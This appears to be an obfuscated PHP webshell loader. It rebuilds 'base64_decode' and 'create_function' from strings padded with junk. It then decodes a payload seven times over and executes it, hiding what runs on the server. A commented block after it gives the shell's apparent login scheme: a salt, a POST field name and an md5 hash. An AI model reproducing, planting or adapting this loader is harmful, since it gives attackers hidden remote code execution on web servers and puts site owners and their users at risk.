<?php
$zxbrpa384 = "VmxWU2JHaG9UV3N3ZUZZeFdtdFRNbEpHVDFWc1lWSnNXbTlV";        
$dogg327 = str_replace("fqb878","","fqb878sfqb878tfqb878rfqb878_rfqb878efqb878plfqb878afqb878ce");
$ummhujkfc581 = "Vm0xNFlWWXlSWGhYV0dST1YwVTFjRlZ0TVc5amJGSllZMGhP";
$brkh764 = $dogg327("pdl516", "", "pdl516bapdl516spdl516e6pdl5164pdl516_pdl516dpdl516epdl516cpdl516opdl516dpdl516e");
$ffqovpfrh753 = "VlZKWFpWWlplV1JHWkU1U2JIQlpWa2R3WVZSc1NrVlJWR3M5";
$uixkwdoml77 = $dogg327("ccwot977","","ccwot977cccwot977reccwot977atccwot977eccwot977_fccwot977uncccwot977tccwot977ioccwot977n");
$duhozm245 = "VlZKc1dqQlpNR2hQVm0xS1IyTkZXbFppV0UweFZtcEdZV1JH";
$ckqkgnec923 = $uixkwdoml77('', $brkh764($brkh764($brkh764($brkh764($brkh764($brkh764($brkh764($dogg327("$;*,.", "", $ummhujkfc581.$duhozm245.$zxbrpa384.$ffqovpfrh753)))))))));
$ckqkgnec923();
?>

---------------------------------------------------
/*自己看密码
$salt = "silic1234";
$psw = trim($_POST['silicpass']);
$password="43b65cee06453f060b117d769825c50e";
$passt = $salt.$psw;
$passt = md5(md5(md5($passt)));
*/
